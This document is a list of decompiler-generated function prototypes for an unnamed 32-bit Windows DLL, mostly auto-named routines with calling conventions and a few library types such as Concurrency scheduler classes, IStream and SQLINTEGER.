void __thiscall sub_1003A1C7(int this);
int __thiscall sub_1003A216(_DWORD *this, __int16 *a2, unsigned int a3);
int __thiscall sub_1003A27E(_DWORD *this, unsigned int a2);
int __thiscall sub_1003A2CA(_DWORD *this, int a2);
int __thiscall sub_1003A2E8(_DWORD *this, int a2);
int __thiscall sub_1003A306(_DWORD *this, unsigned int a2);
unsigned int __thiscall sub_1003A346(_DWORD *this, unsigned int a2, int a3, int a4);
unsigned int __thiscall sub_1003A3B8(_DWORD *this, int a2, int a3, int a4);
void __thiscall sub_1003A417(_DWORD *this);
void __thiscall sub_1003A4CE(_DWORD *this);
void __thiscall sub_1003A531(_DWORD *this, _DWORD *a2, unsigned int a3);
int __thiscall sub_1003A5D3(_DWORD *this, unsigned int a2);
int __thiscall sub_1003A648(_DWORD *this, int a2);
int __thiscall sub_1003A667(_DWORD *this, int a2);
int __thiscall sub_1003A686(_DWORD *this, unsigned int a2);
unsigned int __thiscall sub_1003A6E2(_DWORD *this, unsigned int a2, int *a3, int *a4);
unsigned int __thiscall sub_1003A75E(_DWORD *this, int a2, int a3, int a4);
void __thiscall sub_1003A80F(_DWORD *this);
void __thiscall sub_1003A928(_DWORD *this);
bool __thiscall sub_1003A96B(_DWORD *this, _WORD *a2);
char __thiscall sub_1003A9A4(_DWORD *this, _WORD *a2);
int __thiscall sub_1003A9F3(_DWORD *this, _WORD *a2);
_DWORD *__stdcall sub_1003AA6F(_DWORD *a1);
void __thiscall sub_1003AAB7(_DWORD *this);
int __thiscall sub_1003AAFA(_DWORD *this, _WORD *a2);
int __thiscall sub_1003AB72(_DWORD *this, _WORD *a2);
void __thiscall sub_1003ABD1(void *this, int a2, int a3);
_DWORD *__thiscall sub_1003AC18(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_1003AC49(_DWORD *this, _DWORD *a2);
void *__thiscall sub_1003AC7A(void *Block, char a2);
_DWORD *__thiscall sub_1003AC96(_DWORD *Block, char a2);
void __thiscall sub_1003ACB2(void *); // idb
_DWORD *__thiscall sub_1003ACBF(_DWORD *Block, char a2);
_DWORD *__thiscall sub_1003ACDB(_DWORD *Block, char a2);
// _DWORD *__userpurge sub_1003ACF7@<eax>(_DWORD *a1@<esi>, _DWORD *a2);
_DWORD *__stdcall sub_1003AD43(_DWORD *a1);
// _DWORD *__userpurge sub_1003AD98@<eax>(_DWORD *a1@<esi>, _DWORD *a2);
// int __userpurge sub_1003ADE6@<eax>(_DWORD *a1@<ebx>, _WORD *a2);
int __thiscall sub_1003AE6B(_DWORD *this);
Concurrency::details::UMSFreeThreadProxyFactory *__stdcall sub_1003B05D(Concurrency::details::UMSFreeThreadProxyFactory *a1, int a2, __int16 a3);
_DWORD *__thiscall sub_1003B0EE(_DWORD *Block, char a2);
void __thiscall sub_1003B10A(_DWORD *this);
int __stdcall sub_1003B15A(int a1, int a2);
int __stdcall sub_1003B486(unsigned int a1, int a2, int a3);
// void __userpurge sub_1003B5BB(int a1@<edi>, int a2);
char __stdcall sub_1003B97E(int a1, int a2, int a3, int a4, int a5, int a6);
_DWORD *__stdcall sub_1003BB34(_DWORD *a1);
int __cdecl sub_1003BB7E(int a1);
_DWORD *__thiscall sub_1003BB88(_DWORD *this, char a2);
_DWORD *__thiscall sub_1003BBBB(_DWORD *this);
void __thiscall sub_1003BC12(Concurrency::details::UMSFreeThreadProxyFactory *this);
int sub_1003BC46();
Concurrency::details::UMSFreeThreadProxyFactory *__thiscall sub_1003BC4A(Concurrency::details::UMSFreeThreadProxyFactory *Block, char a2);
Concurrency::details::UMSFreeThreadProxyFactory *__stdcall sub_1003BC66(Concurrency::details::UMSFreeThreadProxyFactory *a1, int a2, __int16 a3);
int __stdcall sub_1003BCB9(int a1, int a2);
int __thiscall sub_1003C213(unsigned __int16 *this);
// int __usercall sub_1003C21F@<eax>(int result@<eax>, int a2@<ecx>);
_DWORD *__cdecl sub_1003C281(_DWORD *a1, int a2);
// int __userpurge sub_1003C2E6@<eax>(int a1@<ecx>, int a2@<edi>, int a3);
Concurrency::details::UMSFreeThreadProxyFactory *__stdcall sub_1003C5E7(Concurrency::details::UMSFreeThreadProxyFactory *a1, int a2, __int16 a3);
Concurrency::details::UMSFreeThreadProxyFactory *__thiscall sub_1003C636(Concurrency::details::UMSFreeThreadProxyFactory *Block, char a2);
void __thiscall sub_1003C652(Concurrency::details::UMSFreeThreadProxyFactory *this);
// int __userpurge sub_1003C676@<eax>(__int32 a1@<eax>, int a2);
int __thiscall sub_1003C6C7(_DWORD *this);
int *__stdcall sub_1003C7EB(int *a1, int *a2);
// char __userpurge sub_1003C819@<al>(_DWORD *a1@<ebx>, int a2);
char __thiscall sub_1003C8A8(void *this, int a2, unsigned __int64 a3, _DWORD *a4, int a5, int a6);
int __stdcall sub_1003CA1A(int a1, int a2, int a3, int a4, int a5, volatile LONG *a6, int a7);
_DWORD *__thiscall sub_1003CBC5(_DWORD *Block, char a2);
void __stdcall sub_1003CBE1(_DWORD *a1);
void __thiscall sub_1003CC01(_DWORD *this);
int __thiscall sub_1003CC55(int *this, _DWORD *a2);
char __stdcall sub_1003CD33(int a1, _DWORD *a2, int a3);
void *__stdcall sub_1003D53E(int a1, void *a2, _DWORD *a3, char a4, int a5, void *a6, int a7);
_DWORD *__thiscall sub_1003D660(void *this, int a2, _DWORD *a3, _DWORD *a4, char a5, void *a6, int a7);
// int __userpurge sub_1003D714@<eax>(int a1@<ebx>, int a2@<esi>, char a3);
// bool __userpurge sub_1003D74B@<al>(_DWORD *a1@<eax>, int a2@<edx>, int a3@<ecx>, int a4);
// char __userpurge sub_1003D7B0@<al>(int a1@<esi>, int a2, int a3, _DWORD *a4, int a5, int a6);
char __stdcall sub_1003D8A7(int a1, int a2, int a3);
void *__thiscall sub_1003D9EE(void *this, int a2, void *a3, _DWORD *a4, char a5, void *a6, int a7);
_DWORD *__thiscall sub_1003DAD8(void *this, _DWORD *a2);
_DWORD *__thiscall sub_1003DB49(void *this, _DWORD *a2, void *Block);
_DWORD *__thiscall sub_1003DBCA(void *this, _DWORD *a2);
_DWORD *__thiscall sub_1003DC3B(void *this, _DWORD *a2);
int __thiscall sub_1003DCC0(void *this, int a2);
_DWORD *__stdcall sub_1003DCEE(_DWORD *a1, int a2);
_DWORD *__thiscall sub_1003DD3A(_DWORD *this);
void __thiscall sub_1003DD71(int *this);
_DWORD *__stdcall sub_1003DD98(_DWORD *a1, int a2);
BOOL __thiscall sub_1003DDE4(int this);
BOOL __thiscall sub_1003DDF7(_DWORD *this);
_DWORD *__thiscall sub_1003DE01(_DWORD *this);
void __thiscall sub_1003DE3E(_DWORD *this);
void __thiscall sub_1003DE42(_DWORD *this);
void __thiscall sub_1003DE46(int *this);
BOOL __thiscall sub_1003DE6D(int this);
_DWORD *__thiscall sub_1003DE80(_DWORD *this);
int *__thiscall sub_1003DEB4(int *this, char a2);
int *__thiscall sub_1003DEE8(int *Block, char a2);
int *__thiscall sub_1003DF04(int *this, char a2);
int *__thiscall sub_1003DF38(int *Block, char a2);
_DWORD *__thiscall sub_1003DF54(_DWORD *this, char a2);
void __thiscall sub_1003DF87(int this);
int __thiscall sub_1003DFD6(_DWORD *this, int *a2, unsigned int a3);
int __thiscall sub_1003E039(int *this, int a2);
int __thiscall sub_1003E051(_DWORD *this, unsigned int a2);
int __thiscall sub_1003E09A(_DWORD *this, int a2);
int __thiscall sub_1003E0B8(_DWORD *this, int a2);
int __thiscall sub_1003E0D6(_DWORD *this, unsigned int a2);
unsigned int __thiscall sub_1003E115(_DWORD *this, unsigned int a2, int a3, int a4);
void __thiscall sub_1003E187(_DWORD *this);
void __thiscall sub_1003E23D(_DWORD *this);
bool __thiscall sub_1003E280(_DWORD *this, _DWORD *a2);
char __thiscall sub_1003E2B7(_DWORD *this, _DWORD *a2);
int __thiscall sub_1003E304(_DWORD *this, _DWORD *a2);
int __thiscall sub_1003E37E(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_1003E3DB(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_1003E435(_DWORD *this, _DWORD *a2);
int __thiscall sub_1003E466(_DWORD *this, int a2);
_DWORD *__stdcall sub_1003E47E(_DWORD *a1);
void __thiscall sub_1003E4D0(int this);
int __thiscall sub_1003E51F(_DWORD *this, int *a2, unsigned int a3);
int __thiscall sub_1003E582(_DWORD *this, unsigned int a2);
int __thiscall sub_1003E5D0(_DWORD *this, int a2);
int __thiscall sub_1003E5EE(_DWORD *this, int a2);
int __thiscall sub_1003E60C(_DWORD *this, unsigned int a2);
unsigned int __thiscall sub_1003E650(_DWORD *this, unsigned int a2, int a3, int a4);
unsigned int __thiscall sub_1003E6C2(_DWORD *this, int a2, int a3, int a4);
_DWORD *__stdcall sub_1003E71F(_DWORD *a1);
void __thiscall sub_1003E765(_DWORD *this);
bool __thiscall sub_1003E7A8(_DWORD *this, _DWORD *a2);
char __thiscall sub_1003E7E7(_DWORD *this, _DWORD *a2);
int __thiscall sub_1003E83C(_DWORD *this, _DWORD *a2);
int __thiscall sub_1003E8C1(_DWORD *this, _DWORD *a2);
void __thiscall sub_1003E926(void *this, int a2, _DWORD *a3);
int __thiscall sub_1003E96B(_DWORD *this);
void __thiscall sub_1003E973(int this);
int __thiscall sub_1003E9C2(_DWORD *this, int *a2, unsigned int a3);
int __thiscall sub_1003EA3A(_DWORD *this, unsigned int a2);
int __thiscall sub_1003EA98(_DWORD *this, int a2);
int __thiscall sub_1003EAB6(_DWORD *this, int a2);
void __thiscall sub_1003EAD4(_DWORD *this, unsigned int a2);
int __thiscall sub_1003EAF6(_DWORD *this, unsigned int a2);
unsigned int __thiscall sub_1003EB44(_DWORD *this, unsigned int a2, int a3, int a4);
unsigned int __thiscall sub_1003EBB6(_DWORD *this, int a2, int a3, int a4);
_DWORD *__stdcall sub_1003EC22(_DWORD *a1);
void __thiscall sub_1003EC9D(_DWORD *this);
bool __thiscall sub_1003ECE0(_DWORD *this, _DWORD *a2);
int __thiscall sub_1003ED17(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_1003ED74(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_1003EDA5(_DWORD *this, _DWORD *a2);
void *__thiscall sub_1003EDFF(void *Block, char a2);
_DWORD *__thiscall sub_1003EE1B(_DWORD *Block, char a2);
void *__thiscall sub_1003EE37(void *Block, char a2);
_DWORD *__thiscall sub_1003EE53(_DWORD *Block, char a2);
void *__thiscall sub_1003EE6F(void *Block, char a2);
_DWORD *__thiscall sub_1003EE8B(_DWORD *Block, char a2);
// _DWORD *__userpurge sub_1003EEA7@<eax>(_DWORD *a1@<esi>, _DWORD *a2);
_DWORD *__stdcall sub_1003EEF5(_DWORD *a1);
_DWORD *__stdcall sub_1003EF32(_DWORD *a1);
// int __userpurge sub_1003EFBD@<eax>(_DWORD *a1@<ebx>, _DWORD *a2);
// int __userpurge sub_1003F03E@<eax>(_DWORD *a1@<ebx>, _DWORD *a2);
// int __userpurge sub_1003F0D1@<eax>(_DWORD *a1@<ebx>, _DWORD *a2);
int __thiscall sub_1003F152(volatile LONG *this, int a2, int a3, volatile LONG *lpAddend, _DWORD *a5, char a6, _DWORD *a7, char a8, int a9, char a10, int *a11, int *a12);
_DWORD *__thiscall sub_1003F205(_DWORD *Block, char a2);
void __thiscall sub_1003F221(_DWORD *this);
int __thiscall sub_1003F255(char *this, int *a2);
// void __usercall sub_1003F373(int a1@<edi>, int *a2@<esi>);
int __thiscall sub_1003F3E9(_DWORD *this, char a2);
void __thiscall sub_1003F4B3(int this, int *a2, int *a3);
_DWORD *__thiscall sub_1003F846(int *this, _DWORD *a2, int *a3, _DWORD *a4);
char sub_1003F8D0();
// int __usercall sub_1003F8DB@<eax>(int a1@<esi>);
// int __usercall sub_1003F8FB@<eax>(int a1@<esi>);
_DWORD *__stdcall sub_1003F91B(_DWORD *a1, int a2);
_DWORD *__thiscall sub_1003F961(_DWORD *this, char a2);
_DWORD *__stdcall sub_1003F99A(_DWORD *a1, int a2);
_DWORD *__stdcall sub_1003F9E0(_DWORD *a1, int a2, int a3);
_DWORD *__fastcall sub_1003FA30(void *a1, int a2, _DWORD *a3);
void *__stdcall sub_1003FA8C(IStream *a1, void *a2, _DWORD *a3, size_t a4, unsigned int a5, char a6, int a7);
int *__stdcall sub_1003FB72(int *a1, _DWORD *a2);
void *__stdcall sub_1003FD3E(IStream *a1, void *a2, int a3, int a4, int *a5, size_t a6, size_t *a7, int a8);
int *__stdcall sub_1003FF49(int *a1, int a2, int a3, int a4, int a5);
_DWORD *__fastcall sub_1004001F(unsigned int a1, _DWORD *a2, LPSTREAM a3, _DWORD *a4, int a5, int a6, char a7);
char *__stdcall sub_10040262(char *a1);
// _DWORD *__usercall sub_100403B9@<eax>(_DWORD *a1@<ecx>, int a2@<edi>);
void __thiscall sub_100403FE(void **this);
// void __usercall sub_10040447(int a1@<esi>);
// _DWORD *__usercall sub_1004046F@<eax>(_DWORD *a1@<esi>);
_DWORD *__thiscall sub_100404A4(_DWORD *Block, char a2);
int __stdcall sub_100404C0(int a1, int a2);
int __thiscall sub_10040543(_DWORD *this);
// _DWORD __thiscall Concurrency::details::ThreadScheduler::ThreadScheduler(Concurrency::details::ThreadScheduler *__hidden this, const struct Concurrency::SchedulerPolicy *); idb
_DWORD *__thiscall sub_10040583(_DWORD *Block, char a2);
void __thiscall sub_1004059F(_DWORD *this);
int __fastcall sub_100405CE(int a1, int a2, _DWORD *a3);
_DWORD *__stdcall sub_1004065E(_DWORD *a1, int a2, int a3, _DWORD *a4, char a5, _DWORD *a6, wchar_t *lpAddend);
void *__thiscall sub_100406D5(void *Block, char a2);
void *__thiscall sub_100406F2(_DWORD *this, void *a2);
// unsigned int __userpurge sub_10040853@<eax>(_DWORD *a1@<ebx>, _DWORD *a2@<esi>, int a3, int Src);
void __thiscall sub_100408B3(_DWORD *this, int a2);
// void __userpurge sub_10040AC6(int a1@<edi>, int *a2@<esi>, int a3, int a4, int a5, unsigned int a6, int a7);
_DWORD *__stdcall sub_10040BB5(_DWORD *a1, int a2);
void __thiscall sub_10040BE8(_DWORD *this);
_DWORD *__thiscall sub_10040C0D(_DWORD *Block, char a2);
_DWORD *__stdcall sub_10040C29(_DWORD *a1);
void __stdcall sub_10040C5B(_DWORD *a1);
_DWORD *__thiscall sub_10040C7B(_DWORD *Block, char a2);
_DWORD *__stdcall sub_10040C98(_DWORD *a1);
_DWORD *__stdcall sub_10040CC9(_DWORD *a1, int a2, int a3);
_DWORD *__thiscall sub_10040DCE(_DWORD *Block, char a2);
void __thiscall sub_10040DEA(_DWORD *this);
_DWORD *__stdcall sub_10040E1F(int a1, _DWORD *a2, int a3, _DWORD *a4);
void __stdcall sub_10041019(int a1);
void __thiscall sub_100411B9(_DWORD *this);
_DWORD *__thiscall sub_100411D8(_DWORD *Block, char a2);
_DWORD *__stdcall sub_100411F4(int a1, _DWORD *a2);
void __thiscall sub_10041333(void **this, int a2);
int __stdcall sub_100413C6(int a1);
_DWORD *__stdcall sub_10041417(int a1, _DWORD *a2, int a3, unsigned int a4, _DWORD *a5);
char __thiscall sub_10041727(_BYTE *this);
// char __usercall sub_10041772@<al>(int a1@<edi>);
// __int16 __usercall sub_10041869@<ax>(int a1@<edi>);
void *__stdcall sub_10041953(int a1, void *a2);
// void *__userpurge sub_10041B96@<eax>(void **a1@<esi>, void *a2);
_DWORD *__thiscall sub_10041C89(void *this, _DWORD *a2, _DWORD *a3, char a4);
// _DWORD *__userpurge sub_10041E91@<eax>(_DWORD *a1@<esi>, _DWORD *a2);
int __thiscall sub_1004204D(int *this, _DWORD *a2);
_DWORD *__thiscall sub_10042286(_DWORD *this, _DWORD *a2);
int __fastcall sub_100425E8(_DWORD *a1, unsigned int a2, char a3);
int __thiscall sub_10042663(_DWORD *this);
__int16 __thiscall sub_10042745(LONG *this);
void __thiscall sub_10042882(_DWORD *this);
void *__thiscall sub_100428DA(void *this, int a2);
_DWORD *__thiscall sub_100428EC(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_10042948(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_100429A4(void *this, _DWORD *a2, unsigned int a3);
int __thiscall sub_10042A2E(void *this, int a2);
void __thiscall sub_10042A6A(void *this);
// int __usercall sub_10042AAB@<eax>(int a1@<esi>);
_DWORD *__thiscall sub_10042AE6(_DWORD *Block, char a2);
// void __usercall sub_10042B02(int a1@<ecx>, int a2@<edi>);
int __thiscall sub_10042B8E(_DWORD *this);
int __thiscall sub_10042BBF(_DWORD *this);
int __thiscall sub_10042BF9(_DWORD *this);
void __thiscall sub_10042C33(int this);
_DWORD *__thiscall sub_10042CAE(_DWORD *this, _DWORD *a2);
void __cdecl __noreturn sub_10042D3D(int a1, int a2);
void __cdecl __noreturn sub_10042D5F(int a1, int a2);
// _DWORD __thiscall Concurrency::details::ThreadScheduler::ThreadScheduler(Concurrency::details::ThreadScheduler *__hidden this, const struct Concurrency::SchedulerPolicy *); idb
// _DWORD __stdcall sub_10042DB2(_DWORD); weak
_DWORD *__thiscall sub_10042DE3(_DWORD *this, int a2);
_DWORD *__stdcall sub_10042E1B(_DWORD *a1, int a2, int a3);
void __thiscall sub_10042E6F(int *this);
_DWORD *__stdcall sub_10042E9E(_DWORD *a1, _DWORD *a2, int a3);
void __thiscall sub_1004323B(_DWORD *this);
void __thiscall sub_1004329E(_DWORD *this, int a2, unsigned int a3);
int __thiscall sub_10043366(_DWORD *this, unsigned int a2);
int __thiscall sub_100433E8(_DWORD *this, int a2);
int __thiscall sub_10043407(_DWORD *this, int a2);
int __thiscall sub_10043426(_DWORD *this, unsigned int a2);
unsigned int __thiscall sub_10043489(_DWORD *this, unsigned int a2, int *a3, int *a4);
unsigned int __thiscall sub_10043505(_DWORD *this, int a2, int a3, void *Block);
void __thiscall sub_100435C6(_DWORD *this);
_DWORD *__thiscall sub_100436EF(_DWORD *Block, char a2);
// void __usercall sub_1004370B(_DWORD *a1@<edi>);
_DWORD *__thiscall sub_10043772(_DWORD *this, int a2, int a3, void *a4, int a5, char a6);
int *__thiscall sub_10043A27(int *Block, char a2);
void __thiscall sub_10043A43(int *this);
void __thiscall sub_10043C45(int this);
_DWORD *__thiscall sub_10044274(unsigned int *this, int a2, _DWORD *a3);
void *__thiscall sub_100442FD(SQLINTEGER this, void *a2, unsigned int a3, SQLINTEGER a4);
// unsigned int __userpurge sub_100449A2@<eax>(int *a1@<esi>, int a2, unsigned int a3);
_DWORD __stdcall sub_10044A12(_DWORD, _DWORD); // weak
void __cdecl __noreturn sub_10044A34(int a1, int a2);
_DWORD *__thiscall sub_10044A7E(void *this, _DWORD *a2);
_DWORD *__thiscall sub_10044AEF(void *this, _DWORD *a2);
_DWORD *__stdcall sub_10044B4D(_DWORD *a1, int a2);
BOOL __thiscall sub_10044BA7(_DWORD *this);
_DWORD *__thiscall sub_10044BB1(_DWORD *this);
void __thiscall sub_10044BEB(_DWORD *this);
void __thiscall sub_10044BEF(int *this);
int *__thiscall sub_10044C24(int *this, char a2);
int *__thiscall sub_10044C58(int *Block, char a2);
void __thiscall sub_10044C74(void *this);
int *__thiscall sub_10044C9F(int *this, int *a2);
void __thiscall sub_10044CF3(_DWORD *this);
void __thiscall sub_10044D56(_DWORD *this, _DWORD *a2, unsigned int a3);
int __thiscall sub_10044DF0(_DWORD *this, unsigned int a2);
int __thiscall sub_10044E5B(_DWORD *this, int a2);
int __thiscall sub_10044E7A(_DWORD *this, int a2);
void __thiscall sub_10044E99(_DWORD *this, unsigned int a2);
int __thiscall sub_10044ED1(int *this);
int __thiscall sub_10044F0A(_DWORD *this, unsigned int a2);
unsigned int __thiscall sub_10044F5C(_DWORD *this, unsigned int a2, int *a3, int *a4);
unsigned int __thiscall sub_10044FD8(_DWORD *this, int a2, int a3, int a4);
void __thiscall sub_1004507F(_DWORD *this);
void __thiscall sub_10045196(_DWORD *this);
char __thiscall sub_100451D9(_DWORD *this, int a2);
int __thiscall sub_1004522B(_DWORD *this, int a2);
void __thiscall sub_100452A4(void *this, int a2, _DWORD *a3);
_DWORD *__thiscall sub_100452EB(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_10045345(_DWORD *Block, char a2);
_DWORD *__thiscall sub_10045361(_DWORD *Block, char a2);
// _DWORD *__userpurge sub_1004537D@<eax>(_DWORD *a1@<esi>, _DWORD *a2);
_DWORD *__stdcall sub_100453C9(_DWORD *a1);
_DWORD *__fastcall sub_10045454(int a1, int a2, _DWORD *a3);
_DWORD *__stdcall sub_1004548C(_DWORD *a1);
void __thiscall sub_100454BE(_DWORD *this);
_DWORD *__thiscall sub_100454E2(_DWORD *Block, char a2);
// int __userpurge sub_100454FE@<eax>(void *a1@<edi>, int a2, int a3, int a4, volatile LONG *lpAddend);
// void __userpurge sub_100455BF(_DWORD *a1@<edi>, int a2, int a3, int a4);
void __stdcall sub_100458E8(_DWORD *a1, int a2, int a3, int a4);
// int __userpurge sub_10045B62@<eax>(_DWORD *a1@<ebx>, int a2);
int __thiscall sub_10045BE1(_DWORD *this, _DWORD *a2);
// _DWORD *__userpurge sub_10045CB5@<eax>(__int32 a1@<eax>, _DWORD *a2@<edi>, _DWORD *a3, void *a4);
// _DWORD *__userpurge sub_10045E73@<eax>(__int32 a1@<eax>, _DWORD *a2, _DWORD *a3, void *a4);
void *__stdcall sub_10045F78(_DWORD *a1, void *a2, int a3, int a4);
void __thiscall sub_10046029(_DWORD *this);
_DWORD *__thiscall sub_100460DA(_DWORD *this, _DWORD *a2, void *a3);
int __thiscall sub_1004624E(_DWORD *this, int a2);
_DWORD *__thiscall sub_100462FE(void *this, _DWORD *a2, _DWORD *a3);
void *__thiscall sub_10046450(_DWORD *this, void *a2, _BYTE *a3, int a4, int a5);
void *__stdcall sub_10046536(_DWORD *a1, void *a2, int *a3);
// _DWORD *__userpurge sub_1004664E@<eax>(_DWORD *a1@<ebx>, _DWORD *a2, int a3);
void *__thiscall sub_10046723(_DWORD *this, void *a2, int a3, unsigned int a4);
// char __usercall sub_100467CF@<al>(int a1@<eax>, int a2@<ecx>, _BYTE *a3@<ebx>, _DWORD *a4@<esi>);
// void __usercall sub_1004681B(int a1@<edi>);
_DWORD *__thiscall sub_10046974(int this, _DWORD *a2, int a3, int a4, int a5, int a6, int a7);
int __fastcall sub_10046B33(_DWORD *a1, _DWORD *a2, int a3, int a4);
// int __userpurge sub_10046C48@<eax>(_DWORD *a1@<ebx>, _DWORD *a2, int a3, int a4);
// int __userpurge sub_10046D48@<eax>(_DWORD *a1@<eax>, _DWORD *a2, int a3, int a4);
// int __userpurge sub_10046DF5@<eax>(_DWORD *a1@<eax>, _DWORD *a2, int a3, int a4);
// int __userpurge sub_10046EA1@<eax>(_DWORD *a1@<ecx>, _DWORD *a2@<ebx>, _DWORD *a3@<edi>, int a4);
// void __usercall sub_10046F01(void *a1@<ecx>, int a2@<edi>);
char __thiscall sub_10046F82(_DWORD *this, DWORD dwMilliseconds);
// char __usercall sub_10047090@<al>(_DWORD *a1@<esi>);
void __cdecl __noreturn sub_100470BB(const struct Concurrency::SchedulerPolicy *pExceptionObject);
// _DWORD __thiscall Concurrency::details::ThreadScheduler::ThreadScheduler(Concurrency::details::ThreadScheduler *__hidden this, const struct Concurrency::SchedulerPolicy *); idb
_DWORD *__stdcall sub_1004710C(_DWORD *a1, int a2, int a3);
int *__thiscall sub_100471C9(int *Block, char a2);
void __thiscall sub_100471E5(int *this);
void *__thiscall sub_10047209(_DWORD *this, void *a2, void *a3, _DWORD *a4, int a5);
int __stdcall sub_10047404(int a1, int a2, _BYTE *a3);
void *__thiscall sub_1004743F(void *Block, char a2);
int __stdcall sub_1004745B(int *a1);
int __thiscall sub_10047482(void *this);
// _DWORD *__usercall sub_100474F3@<eax>(int a1@<eax>, int a2@<ecx>, _DWORD *a3@<esi>);
// _DWORD *__usercall sub_10047535@<eax>(int a1@<edi>, _DWORD *a2@<esi>);
_DWORD *__thiscall sub_100475A5(int this, _DWORD *a2, int *a3, int a4, _DWORD *a5);
// int *__userpurge sub_1004767A@<eax>(int *a1@<edi>, int a2, int a3);
// int *__usercall sub_100476E1@<eax>(int a1@<eax>, int *a2@<esi>);
// int *__usercall sub_10047729@<eax>(int a1@<eax>, int *a2@<ebx>);
// _DWORD *__userpurge sub_1004777B@<eax>(int a1@<eax>, unsigned int *a2@<esi>, int a3, _DWORD *a4, char a5);
_DWORD *__stdcall sub_10047829(_DWORD *a1, int a2, int a3, int a4);
int *__thiscall sub_100478A4(int *Block, char a2);
void __thiscall sub_100478C0(int *this);
// int __userpurge sub_100478E4@<eax>(int a1@<ecx>, _DWORD *a2@<ebp>, void *a3, void *a4, int a5, int a6);
void __thiscall sub_10047B39(int *this);
int __stdcall sub_10047B57(int a1, int a2, int a3, volatile LONG **a4, int a5);
// _DWORD *__userpurge sub_10047CBA@<eax>(__int32 a1@<eax>, _DWORD *a2, _DWORD *a3, _DWORD *a4, int *a5);
_DWORD *__stdcall sub_10047ECB(_DWORD *a1, _DWORD *a2);
char __thiscall sub_10047FB7(_DWORD *this, _DWORD *a2, _DWORD *a3, int *a4);
// _DWORD *__userpurge sub_10048BE6@<eax>(__int32 a1@<eax>, int a2@<ecx>, _DWORD *a3, void *a4);
void *__fastcall sub_10048D1C(_DWORD *a1, void *a2, _DWORD *a3, void *a4);
// _DWORD *__userpurge sub_10049085@<eax>(__int32 a1@<eax>, _DWORD *a2, _DWORD *a3, _DWORD *a4, void *Src);
int __stdcall sub_10049283(int a1);
void __thiscall sub_100492F6(void *this, _DWORD *a2);
// void __usercall sub_100498D6(void *a1@<ecx>, _DWORD *a2@<edi>);
// void *__usercall sub_100499E5@<eax>(_DWORD *a1@<ecx>, _DWORD *a2@<esi>);
void __stdcall sub_10049A8F(_DWORD *a1, _DWORD *a2, _DWORD *a3, _DWORD *a4, void *a5);
void __thiscall sub_10049B9A(int *this, int a2, _DWORD *a3);
// int __userpurge sub_10049C76@<eax>(_DWORD *a1@<edi>, int a2, int *a3);
// void *__userpurge sub_10049F4B@<eax>(int *a1@<esi>, void *a2, _DWORD *a3);
_DWORD *__cdecl sub_1004A04D(_DWORD *a1, int a2);
unsigned int __cdecl sub_1004A152(int a1);
char __thiscall sub_1004A363(_DWORD *this);
int __thiscall sub_1004A44E(int this, int a2);
_DWORD *__thiscall sub_1004A47F(void *this, _DWORD *a2);
_DWORD *__stdcall sub_1004A4F0(_DWORD *a1, int a2);
int __thiscall sub_1004A53E(int this);
void __thiscall sub_1004A572(_DWORD *this);
void __thiscall sub_1004A576(_DWORD *this);
void __thiscall sub_1004A57A(int *this);
int *__thiscall sub_1004A5A1(int *this, char a2);
int *__thiscall sub_1004A5D5(int *Block, char a2);
void __thiscall sub_1004A5F1(int this);
int __thiscall sub_1004A640(_DWORD *this, double *a2, unsigned int a3);
int __thiscall sub_1004A6A5(_DWORD *this, unsigned int a2);
int __thiscall sub_1004A6EF(_DWORD *this, int a2);
int __thiscall sub_1004A70D(_DWORD *this, int a2);
void __thiscall sub_1004A72B(_DWORD *this, unsigned int a2);
int __thiscall sub_1004A74D(void **this);
int __thiscall sub_1004A771(_DWORD *this, unsigned int a2);
unsigned int __thiscall sub_1004A7B1(_DWORD *this, unsigned int a2, int a3, int a4);
unsigned int __thiscall sub_1004A823(_DWORD *this, int a2, int a3, int a4);
void __thiscall sub_1004A880(_DWORD *this);
_DWORD *__stdcall sub_1004A936(_DWORD *a1);
void __thiscall sub_1004A9AF(_DWORD *this);
bool __thiscall sub_1004A9F2(_DWORD *this, double *a2);
char __thiscall sub_1004AA2E(_DWORD *this, double *a2);
int __thiscall sub_1004AA80(_DWORD *this, double *a2);
int __thiscall sub_1004AAFB(_DWORD *this, double *a2);
void __thiscall sub_1004AB5D(void *this, int a2, int a3);
_DWORD *__thiscall sub_1004ABA4(_DWORD *this, _DWORD *a2);
int __thiscall sub_1004ABFE(_DWORD *this);
void *__thiscall sub_1004AC12(void *Block, char a2);
_DWORD *__thiscall sub_1004AC2E(_DWORD *Block, char a2);
_DWORD *__stdcall sub_1004AC4A(_DWORD *a1);
// int __userpurge sub_1004ACD5@<eax>(_DWORD *a1@<ebx>, double *a2);
int __thiscall sub_1004AD60(_DWORD *this, _DWORD *a2, char a3);
int __stdcall sub_1004AF1C(int a1, __int16 a2, int a3, int a4);
void __stdcall sub_1004AF94(_DWORD *a1);
int __thiscall sub_1004AFDD(_DWORD *this, unsigned __int64 a2, int a3);
char __stdcall sub_1004B47E(char *a1, int a2, int a3, int *a4);
void *__stdcall sub_1004B599(_DWORD *a1, void *a2, char a3, int a4);
// int __userpurge sub_1004B655@<eax>(_DWORD *a1@<esi>, unsigned __int64 a2, unsigned __int64 a3);
char __stdcall sub_1004B684(int a1, int a2, _DWORD *a3);
int __thiscall sub_1004B727(int this);
void *__thiscall sub_1004B91A(int this, void *a2, int a3);
void __thiscall sub_1004BC40(int *this, int a2, int a3);
char __thiscall sub_1004BE36(int *this, int *a2, int *a3);
// char __usercall sub_1004BFBD@<al>(int a1@<ecx>, _DWORD *a2@<edi>, int *a3@<esi>);
// int __usercall sub_1004C0E4@<eax>(int a1@<esi>);
int __thiscall sub_1004C108(void *this, int a2, int a3, int a4, int a5, int a6, int a7);
int __thiscall sub_1004C16D(int this, int a2);
_DWORD *__thiscall sub_1004C19E(void *this, _DWORD *a2);
BOOL __thiscall sub_1004C223(int this);
_DWORD *__thiscall sub_1004C240(_DWORD *this);
void __thiscall sub_1004C27C(_DWORD *this);
void __thiscall sub_1004C287(int this);
unsigned int __thiscall sub_1004C2D6(_DWORD *this, int *a2, unsigned int a3);
int __thiscall sub_1004C353(_DWORD *this, unsigned int a2);
